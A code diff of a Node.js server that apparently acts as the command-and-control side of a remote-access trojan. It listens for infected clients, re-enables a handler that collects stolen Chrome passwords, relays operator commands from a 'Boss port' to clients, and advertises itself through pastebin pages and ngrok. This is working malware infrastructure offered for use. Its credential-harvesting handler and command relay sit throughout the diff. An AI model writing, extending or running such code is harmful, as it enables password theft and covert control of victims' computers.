@@ -2,10 +2,10 @@ var net = require('net');
 var readline = require('readline');
 var ngrok = require('ngrok');
 var paste = require("better-pastebin");
-var sqlite3 = require('sqlite3');
-var db = new sqlite3.Database("userdata.db");
+//var sqlite3 = require('sqlite3');
+//var db = new sqlite3.Database("userdata.db");
 var colors = require('colors');
-var CryptoJS = require('crypto-js');
+//var CryptoJS = require('crypto-js');
 
 
 /*var blessed = require('blessed');
@@ -50,14 +50,14 @@ net.createServer(function (socket) {
       case "yn":
           console.log("\n" + arr[1] + "\n");
         break;
-      /*case "pass":
+      case "pass":
           arrOfPass = arr[1].split("\n");
           chromePasswords.push(arrOfPass);
-        arrOfPass.forEach(function (entry) {
-        	data = entry.split(">>");
-        	savePassToSQLite(data[0], data[1], data[2]);
-            });
-        break;*/
+        //arrOfPass.forEach(function (entry) {
+        //	data = entry.split(">>");
+        //	savePassToSQLite(data[0], data[1], data[2]);
+        //    });
+        break;
 
       default:
           console.log("\n" + arr[1] + "\n");
@@ -70,7 +70,7 @@ net.createServer(function (socket) {
       if (socket.nick != null) {
           console.log("User disconnected: ".green + socket.nick);
       } else {
-          console.log("User disconnected: ".green + socket.name);
+          //console.log("User disconnected: ".green + socket.name);
       }
   	});
 }).listen(4434);
@@ -78,6 +78,7 @@ net.createServer(function (socket) {
 
 //Boss port
 net.createServer(function (socket) {
+    socket.write(clients.name);
     socket.on('data', function (data) {
       sendCommand(data);
       console.log("Recived cmd from 8000\n".america);
@@ -152,12 +153,12 @@ function updatePastebin(text) {
     paste.edit("BuG97BSk", text, function (success, data) {
       if (success) {
         if (text != data) {
-          console.log('failed to update pastebin!!!'.bgBlue.red)
-          console.log(text +" != "+ data)
-          updatePastebin(text)
+            console.log('failed to update pastebin!!!'.bgBlue.red);
+            console.log(text +" != "+ data);
+            updatePastebin(text);
         }
         console.log("Updated pastebin ".cyan + "(client)".red);
-        console.log("Client pastebin now: ".cyan + data.cyan)
+          console.log("Client pastebin now: ".cyan + data.cyan);
       }
     });
 }
@@ -165,25 +166,12 @@ function updatePastebinBoss(text) {
     paste.edit("LWK9KdSW", text, function (success, data) {
       if (success) {
         if (text != data) {
-          console.log('failed to update pastebin!!!'.bgBlue.red)
-          console.log(text +" != "+ data)
-          updatePastebinBoss(text)
+            console.log('failed to update pastebin!!!'.bgBlue.red);
+            console.log(text +" != "+ data);
+            updatePastebinBoss(text);
         }
-        console.log("Updated pastebin ".cyan+ "(boos)".red)
-        console.log("Boss pastebin now: ".cyan + data.cyan)
+          console.log("Updated pastebin ".cyan+ "(boos)".red);
+          console.log("Boss pastebin now: ".cyan + data.cyan);
       }
     });
 }
-
-
-
-
-//Encrypt
-var ciphertext = CryptoJS.AES.encrypt
-
-
-
-
-
-
-
